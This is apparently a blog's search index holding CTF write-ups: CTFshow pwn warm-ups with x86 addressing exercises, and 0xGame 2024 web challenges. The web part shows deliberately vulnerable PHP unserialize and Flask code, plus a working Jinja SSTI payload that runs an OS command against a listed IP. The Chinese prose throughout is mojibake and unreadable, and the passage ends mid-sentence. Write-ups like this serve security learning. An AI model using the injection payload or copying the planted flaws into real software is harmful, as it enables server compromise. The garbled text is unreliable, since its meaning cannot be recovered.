<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>pwnå…¥é—¨-å‰ç½®åŸºç¡€</title>
      <link href="/2024/10/08/pwn%E5%85%A5%E9%97%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/"/>
      <url>/2024/10/08/pwn%E5%85%A5%E9%97%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h3 id="ä»é›¶å¼€å§‹çš„pwnç”Ÿæ´»"><a href="#ä»é›¶å¼€å§‹çš„pwnç”Ÿæ´»" class="headerlink" title="ä»é›¶å¼€å§‹çš„pwnç”Ÿæ´»"></a>ä»é›¶å¼€å§‹çš„pwnç”Ÿæ´»</h3><h4 id="pwn0"><a href="#pwn0" class="headerlink" title="pwn0"></a>pwn0</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> ctfshow@pwn.challenge.ctf.show <span class="token parameter variable">-p28184</span> <span class="token comment"># 123456</span></code></pre><p>sshè¿æ¥ä¼šæœ‰ä¸€æ®µç‚«é…·çš„ç”»é¢ </p><p><img src="testnc1.png" loading="lazy"></p><h4 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h4><p>IDAåç¼–è¯‘ä¸€ä¸‹é™„ä»¶</p><p><img src="testnc2.png" loading="lazy"></p><p>ncç›´æ¥ç»™flag</p><h4 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h4><p><img src="testnc3.png" loading="lazy"></p><p>å¤ªå‹å¥½äº† ç›´æ¥ç»™äº†shell</p><h4 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h4><p><img src="testnc4.png" loading="lazy"></p><p><img src="testnc4_2.png" loading="lazy"></p><p>ç›´æ¥é€‰6æ‹¿flag</p><h4 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h4><p><img src="testnc5.png" loading="lazy"></p><p>è¾“å…¥<code>CTFshowPWN</code> getshell</p><h3 id="å‰ç½®åŸºç¡€"><a href="#å‰ç½®åŸºç¡€" class="headerlink" title="å‰ç½®åŸºç¡€"></a>å‰ç½®åŸºç¡€</h3><h4 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h4><p>è¿è¡Œæ­¤æ–‡ä»¶ï¼Œå°†å¾—åˆ°çš„å­—ç¬¦ä¸²ä»¥ctfshow{xxxxx}æäº¤ã€‚</p><p>æ±‡ç¼–ä»£ç </p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">section .data    msg db &quot;Welcome_to_CTFshow_PWN&quot;, 0section .text    global _start_start:; ç«‹å³å¯»å€æ–¹å¼    mov eax, 11         ; å°†11èµ‹å€¼ç»™eax    add eax, 114504     ; eaxåŠ ä¸Š114504    sub eax, 1          ; eaxå‡å»1; å¯„å­˜å™¨å¯»å€æ–¹å¼    mov ebx, 0x36d      ; å°†0x36dèµ‹å€¼ç»™ebx    mov edx, ebx        ; å°†ebxçš„å€¼èµ‹å€¼ç»™edx; ç›´æ¥å¯»å€æ–¹å¼    mov ecx, msg      ; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx; å¯„å­˜å™¨é—´æ¥å¯»å€æ–¹å¼    mov esi, msg        ; å°†msgçš„åœ°å€èµ‹å€¼ç»™esi    mov eax, [esi]      ; å°†esiæ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax; å¯„å­˜å™¨ç›¸å¯¹å¯»å€æ–¹å¼    mov ecx, msg        ; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx    add ecx, 4          ; å°†ecxåŠ ä¸Š4    mov eax, [ecx]      ; å°†ecxæ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax; åŸºå€å˜å€å¯»å€æ–¹å¼    mov ecx, msg        ; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx    mov edx, 2          ; å°†2èµ‹å€¼ç»™edx    mov eax, [ecx + edx*2]  ; å°†ecx+edx*2æ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax; ç›¸å¯¹åŸºå€å˜å€å¯»å€æ–¹å¼    mov ecx, msg        ; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx    mov edx, 1          ; å°†1èµ‹å€¼ç»™edx    add ecx, 8          ; å°†ecxåŠ ä¸Š8    mov eax, [ecx + edx*2 - 6]  ; å°†ecx+edx*2-6æ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax; è¾“å‡ºå­—ç¬¦ä¸²    mov eax, 4          ; ç³»ç»Ÿè°ƒç”¨å·4ä»£è¡¨è¾“å‡ºå­—ç¬¦ä¸²    mov ebx, 1          ; æ–‡ä»¶æè¿°ç¬¦1ä»£è¡¨æ ‡å‡†è¾“å‡º    mov ecx, msg        ; è¦è¾“å‡ºçš„å­—ç¬¦ä¸²çš„åœ°å€    mov edx, 22         ; è¦è¾“å‡ºçš„å­—ç¬¦ä¸²çš„é•¿åº¦    int 0x80            ; è°ƒç”¨ç³»ç»Ÿè°ƒç”¨; é€€å‡ºç¨‹åº    mov eax, 1          ; ç³»ç»Ÿè°ƒç”¨å·1ä»£è¡¨é€€å‡ºç¨‹åº    xor ebx, ebx        ; è¿”å›å€¼ä¸º0s    int 0x80            ; è°ƒç”¨ç³»ç»Ÿè°ƒç”¨</code></pre><p>ä½¿ç”¨NASMæ±‡ç¼–å™¨å’Œldé“¾æ¥å™¨ç¼–è¯‘æˆå¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å°†å…¶ç¼–è¯‘ä¸ºå¯¹è±¡æ–‡ä»¶</p><pre class="language-bash" data-language="bash"><code class="language-bash">nasm <span class="token parameter variable">-f</span> elf pwn5_1.asm</code></pre><p>è¿™å°†ç”Ÿæˆä¸€ä¸ªåä¸ºpwn5_1.o çš„å¯¹è±¡æ–‡ä»¶ã€‚æ¥ä¸‹æ¥ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å°†å¯¹è±¡æ–‡ä»¶é“¾æ¥æˆå¯æ‰§è¡Œæ–‡ä»¶ï¼š </p><pre class="language-bash" data-language="bash"><code class="language-bash">ld <span class="token parameter variable">-m</span> elf_i386 <span class="token parameter variable">-s</span> <span class="token parameter variable">-o</span> pwn5_1 pwn5_1.o</code></pre><p><code>ld</code> æ˜¯ Linux ä¸‹çš„é“¾æ¥å™¨ï¼Œç”¨äºå°†ä¸€ä¸ªæˆ–å¤šä¸ªå¯¹è±¡æ–‡ä»¶ï¼ˆ<code>.o</code> æ–‡ä»¶ï¼‰å’Œåº“æ–‡ä»¶é“¾æ¥æˆå¯æ‰§è¡Œæ–‡ä»¶æˆ–åº“æ–‡ä»¶ã€‚åœ¨ä½ æä¾›çš„å‘½ä»¤ä¸­ï¼š</p><ul><li><code>ld</code>ï¼šé“¾æ¥å™¨ç¨‹åºæœ¬èº«ã€‚</li><li><code>-m elf_i386</code>ï¼šæŒ‡å®šç”Ÿæˆçš„ç›®æ ‡æ–‡ä»¶æ ¼å¼ä¸º <code>elf_i386</code>ï¼Œè¿™æ˜¯ä¸º 32 ä½ Intel æ¶æ„è®¡ç®—æœºç”Ÿæˆçš„ ELFï¼ˆExecutable and Linkable Formatï¼‰æ ¼å¼ã€‚</li><li><code>-s</code>ï¼šè¿™ä¸ªé€‰é¡¹å‘Šè¯‰é“¾æ¥å™¨åœ¨ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶ä¸­å‰¥ç¦»æ‰€æœ‰ç¬¦å·ä¿¡æ¯ã€‚è¿™é€šå¸¸ç”¨äºå‡å°‘å¯æ‰§è¡Œæ–‡ä»¶çš„å¤§å°ï¼Œå¹¶ä¸”å¯èƒ½ç”¨äºå®‰å…¨ç›®çš„ï¼Œä»¥é˜²æ­¢æŸäº›ç±»å‹çš„é€†å‘å·¥ç¨‹ã€‚</li><li><code>-o pwn5_1</code>ï¼šæŒ‡å®šè¾“å‡ºæ–‡ä»¶çš„åç§°ä¸º <code>pwn5_1</code>ã€‚</li><li><code>pwn5_1.o</code>ï¼šè¿™æ˜¯è¦é“¾æ¥çš„å¯¹è±¡æ–‡ä»¶ã€‚</li></ul><p>è¿™å°†ç”Ÿæˆä¸€ä¸ªåä¸º pwn5_1 çš„å¯æ‰§è¡Œæ–‡ä»¶  (äº‹å®ä¸Šé¢˜ç›®é™„ä»¶ç¬¬äºŒä¸ªå°±æ˜¯)</p><p>è¿è¡Œpwn5_1æˆ–è€…pwn5_2å³å¯</p><h4 id="pwn6-ç«‹å³å¯»å€"><a href="#pwn6-ç«‹å³å¯»å€" class="headerlink" title="pwn6(ç«‹å³å¯»å€)"></a>pwn6(ç«‹å³å¯»å€)</h4><p>ç«‹å³å¯»å€æ–¹å¼ç»“æŸåeaxå¯„å­˜å™¨çš„å€¼ä¸ºï¼Ÿ</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">ç«‹å³å¯»å€æ–¹å¼    mov eax, 11         ; å°†11èµ‹å€¼ç»™eax    add eax, 114504     ; eaxåŠ ä¸Š114504    sub eax, 1          ; eaxå‡å»1</code></pre><p>11+114504-1&#x3D;114514</p><h4 id="pwn7-å¯„å­˜å™¨å¯»å€"><a href="#pwn7-å¯„å­˜å™¨å¯»å€" class="headerlink" title="pwn7(å¯„å­˜å™¨å¯»å€)"></a>pwn7(å¯„å­˜å™¨å¯»å€)</h4><p>å¯„å­˜å™¨å¯»å€æ–¹å¼ç»“æŸåedxå¯„å­˜å™¨çš„å€¼ä¸ºï¼Ÿ</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">å¯„å­˜å™¨å¯»å€æ–¹å¼    mov ebx, 0x36d      ; å°†0x36dèµ‹å€¼ç»™ebx    mov edx, ebx        ; å°†ebxçš„å€¼èµ‹å€¼ç»™edx</code></pre><p>0x36D</p><h4 id="pwn8-ç›´æ¥å¯»å€"><a href="#pwn8-ç›´æ¥å¯»å€" class="headerlink" title="pwn8(ç›´æ¥å¯»å€)"></a>pwn8(ç›´æ¥å¯»å€)</h4><p>ç›´æ¥å¯»å€æ–¹å¼ç»“æŸåecxå¯„å­˜å™¨çš„å€¼ä¸ºï¼Ÿ</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">section .data    msg db &quot;Welcome_to_CTFshow_PWN&quot;, 0ç›´æ¥å¯»å€æ–¹å¼    mov ecx, [msg]      ; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx</code></pre><p><img src="pwn8.png" loading="lazy"></p><p>0x80490E8</p><h4 id="pwn9-å¯„å­˜å™¨é—´æ¥å¯»å€"><a href="#pwn9-å¯„å­˜å™¨é—´æ¥å¯»å€" class="headerlink" title="pwn9(å¯„å­˜å™¨é—´æ¥å¯»å€)"></a>pwn9(å¯„å­˜å™¨é—´æ¥å¯»å€)</h4><p>å¯„å­˜å™¨é—´æ¥å¯»å€æ–¹å¼ç»“æŸåeaxå¯„å­˜å™¨çš„å€¼ä¸ºï¼Ÿ</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">å¯„å­˜å™¨é—´æ¥å¯»å€æ–¹å¼    mov esi, msg        ; å°†msgçš„åœ°å€èµ‹å€¼ç»™esi    mov eax, [esi]      ; å°†esiæ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax</code></pre><p><img src="pwn9.png" loading="lazy"></p><p><img src="pwn9_2.png" loading="lazy"></p><p>0x636C6557</p><h4 id="pwn10-å¯„å­˜å™¨ç›¸å¯¹å¯»å€"><a href="#pwn10-å¯„å­˜å™¨ç›¸å¯¹å¯»å€" class="headerlink" title="pwn10(å¯„å­˜å™¨ç›¸å¯¹å¯»å€)"></a>pwn10(å¯„å­˜å™¨ç›¸å¯¹å¯»å€)</h4><p>å¯„å­˜å™¨ç›¸å¯¹å¯»å€æ–¹å¼ç»“æŸåeaxå¯„å­˜å™¨çš„å€¼ä¸ºï¼Ÿ</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">å¯„å­˜å™¨ç›¸å¯¹å¯»å€æ–¹å¼    mov ecx, msg        ; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx    add ecx, 4          ; å°†ecxåŠ ä¸Š4    mov eax, [ecx]      ; å°†ecxæ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax</code></pre><p><img src="pwn10.png" loading="lazy"></p><p>080490E8+4&#x3D;080490EC  â€œome_to_CTFshow_PWNâ€</p><h4 id="pwn11-åŸºå€å˜å€å¯»å€"><a href="#pwn11-åŸºå€å˜å€å¯»å€" class="headerlink" title="pwn11(åŸºå€å˜å€å¯»å€)"></a>pwn11(åŸºå€å˜å€å¯»å€)</h4><p>åŸºå€å˜å€å¯»å€æ–¹å¼ç»“æŸåçš„eaxå¯„å­˜å™¨çš„å€¼ä¸ºï¼Ÿ</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">åŸºå€å˜å€å¯»å€æ–¹å¼    mov ecx, msg        ; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx    mov edx, 2          ; å°†2èµ‹å€¼ç»™edx    mov eax, [ecx + edx*2]  ; å°†ecx+edx*2æ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax</code></pre><p>080490E8+2*2&#x3D;080490EC  â€œome_to_CTFshow_PWNâ€</p><h4 id="pwn12-ç›¸å¯¹åŸºå€å˜å€å¯»å€"><a href="#pwn12-ç›¸å¯¹åŸºå€å˜å€å¯»å€" class="headerlink" title="pwn12(ç›¸å¯¹åŸºå€å˜å€å¯»å€)"></a>pwn12(ç›¸å¯¹åŸºå€å˜å€å¯»å€)</h4><p>ç›¸å¯¹åŸºå€å˜å€å¯»å€æ–¹å¼ç»“æŸåeaxå¯„å­˜å™¨çš„å€¼ä¸ºï¼Ÿ</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">ç›¸å¯¹åŸºå€å˜å€å¯»å€æ–¹å¼    mov ecx, msg        ; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx    mov edx, 1          ; å°†1èµ‹å€¼ç»™edx    add ecx, 8          ; å°†ecxåŠ ä¸Š8    mov eax, [ecx + edx*2 - 6]  ; å°†ecx+edx*2-6æ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax</code></pre><p>080490E8+8+1*2-6&#x3D;080490EC â€œome_to_CTFshow_PWNâ€</p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> Test_your_nc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20240xGame</title>
      <link href="/2024/10/06/20240xGame/"/>
      <url>/2024/10/06/20240xGame/</url>
      
        <content type="html"><![CDATA[<h3 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h3><h4 id="ez-unser"><a href="#ez-unser" class="headerlink" title="ez_unser"></a>ez_unser</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Man</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string double-quoted-string">"åŸç¥ï¼Œå¯åŠ¨"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">str_split</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//æŠŠå­—ç¬¦ä¸²åˆ†å‰²åˆ°æ•°ç»„ä¸­ã€‚</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">What</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$Kun</span><span class="token operator">=</span><span class="token string double-quoted-string">"ä¸¤å¹´åŠ"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Kun</span><span class="token operator">-></span><span class="token property">hobby</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"Ok"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Can</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$Hobby</span><span class="token operator">=</span><span class="token string double-quoted-string">"å”±è·³rapç¯®çƒ"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Hobby</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">I</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string double-quoted-string">"Kobe"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__debugInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">-></span><span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Say</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$evil</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evil</span><span class="token operator">-></span><span class="token function">Evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Mamba</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">Evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$filename</span><span class="token operator">=</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".log"</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"content"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Out</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$arguments</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"./"</span><span class="token operator">.</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"ç¬¬äº”äººæ ¼"</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"o"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">,</span><span class="token variable">$n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span></code></pre><h4 id="ez-ssti"><a href="#ez-ssti" class="headerlink" title="ez_ssti"></a>ez_ssti</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> render_template_string<span class="token keyword">import</span> osapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>flag<span class="token operator">=</span>os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>unsetenv<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">page_not_found</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>root_url<span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token string">"&lt;h1>The Url &#123;&#125; You Requested Can Not Found&lt;/h1>"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8000</span><span class="token punctuation">)</span></code></pre><p>Payload:</p><pre class="language-bash" data-language="bash"><code class="language-bash">http://47.76.152.109:60082/<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum.__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span>.popen<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>GetShelläº†æ²¡æ‰¾åˆ°flag  å¾ˆæ–°é¢–çš„è€ƒæ³• æ²¡æ³•ç”¨fenjingå‘½ä»¤è¡Œäº† <del>å¯ä»¥ä½œä¸ºpythonåº“ä½¿ç”¨ï¼Ÿ</del></p><pre class="language-python" data-language="python"><code class="language-python">flag<span class="token operator">=</span>os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>unsetenv<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span></code></pre><p>è¯»åˆ°pythonå unsetäº†</p><pre class="language-python" data-language="python"><code class="language-python">flag <span class="token operator">=</span> <span class="token string">"aa"</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">.</span>__repr__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>å°è¯•äº†è¿™ä¸ª ä¸è¿‡æ²¡å•¥ç”¨ğŸ˜­</p><h4 id="ez-login"><a href="#ez-login" class="headerlink" title="ez_login"></a>ez_login</h4><h4 id="ez-rce"><a href="#ez-rce" class="headerlink" title="ez_rce"></a>ez_rce</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token keyword">import</span> subprocessapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/calc"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">calculator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    expression <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'expression'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token string">"114 1000 * 514 + p"</span>    result <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"dc"</span><span class="token punctuation">,</span> <span class="token string">"-e"</span><span class="token punctuation">,</span> expression<span class="token punctuation">]</span><span class="token punctuation">,</span> capture_output<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> result<span class="token punctuation">.</span>stdout<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8000</span><span class="token punctuation">)</span></code></pre><ol><li><p>1.<code>def calculator():</code>ï¼šå®šä¹‰äº†ä¸€ä¸ªåä¸º <code>calculator</code> çš„å‡½æ•°ã€‚</p></li><li><p>2.<code>expression = request.form.get(&#39;expression&#39;) or &quot;114 1000 * 514 + p&quot;</code>ï¼šè¿™è¡Œä»£ç å°è¯•ä»ä¸€ä¸ªHTTPè¯·æ±‚ä¸­è·å–åä¸º â€˜expressionâ€™ çš„è¡¨å•å­—æ®µå€¼ã€‚å¦‚æœè¿™ä¸ªå­—æ®µä¸å­˜åœ¨ï¼ˆå³ <code>request.form.get(&#39;expression&#39;)</code> è¿”å› <code>None</code>ï¼‰ï¼Œåˆ™ä½¿ç”¨é»˜è®¤çš„å­—ç¬¦ä¸² <code>&quot;114 1000 * 514 + p&quot;</code> ä½œä¸ºè¡¨è¾¾å¼ã€‚è¿™ä¸ªé»˜è®¤è¡¨è¾¾å¼çœ‹èµ·æ¥åƒæ˜¯ä¸€ä¸ªæœªå®Œæˆçš„ç®—æœ¯è¡¨è¾¾å¼ï¼Œå…¶ä¸­ <code>p</code> å¯èƒ½æ˜¯ä¸€ä¸ªå ä½ç¬¦ã€‚</p></li><li><p>3.<code>result = subprocess.run([&quot;dc&quot;, &quot;-e&quot;, expression], capture_output=True, text=True)</code>ï¼šè¿™è¡Œä»£ç ä½¿ç”¨ <code>subprocess.run</code> å‡½æ•°æ¥è¿è¡Œ <code>dc</code> å‘½ä»¤ã€‚<code>dc</code> æ˜¯ä¸€ä¸ªé€†æ³¢å…°è¡¨ç¤ºæ³•ï¼ˆReverse Polish Notation, RPNï¼‰çš„è®¡ç®—å™¨ï¼Œå¸¸ç”¨äºå‘½ä»¤è¡Œç¯å¢ƒã€‚å‚æ•°è§£é‡Šå¦‚ä¸‹ï¼š<code>[&quot;dc&quot;, &quot;-e&quot;, expression]</code>ï¼šè¿™æ˜¯ä¼ 